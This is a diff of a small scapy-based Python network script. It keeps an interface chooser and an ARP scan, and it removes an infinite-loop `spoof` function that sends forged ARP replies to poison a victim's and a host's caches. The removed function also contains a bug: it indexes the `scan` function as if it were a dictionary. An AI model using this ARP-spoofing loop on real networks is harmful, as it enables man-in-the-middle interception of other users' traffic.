@@ -1,7 +1,6 @@
 import scapy.all as scapy
 import subprocess
 import re
-import time
 
 
 def choose_iface_ip():
@@ -11,10 +10,10 @@ def choose_iface_ip():
     for i in range(len(avaliable_ifaces)):
         if avaliable_ifaces[i][0]=='n':
             avaliable_ifaces[i] = avaliable_ifaces[i][1:]
-
     for i in range(len(avaliable_ifaces)):
         choose_ip.append(avaliable_ifaces[i] + avaliable_ip[i].replace('inet ', '') + 'x')
     return choose_ip
+
 
 def scan(ip):
     arp = scapy.ARP(op=1, pdst=ip)
@@ -25,12 +24,6 @@ def scan(ip):
         clients.update({received.psrc : received.hwsrc})
     return clients
 
-
-def spoof(victim_ip,host_ip):
-    while(True):
-        scapy.send(scapy.ARP(op=2,pdst=victim_ip, hwdst=scan[victim_ip], psrc=host_ip))
-        scapy.send(scapy.ARP(op=2,pdst=host_ip, hwdst=scan[host_ip], psrc=victim_ip))
-        time.sleep(2)
 
 
 print('Choose one:',*choose_iface_ip(), sep='\n')
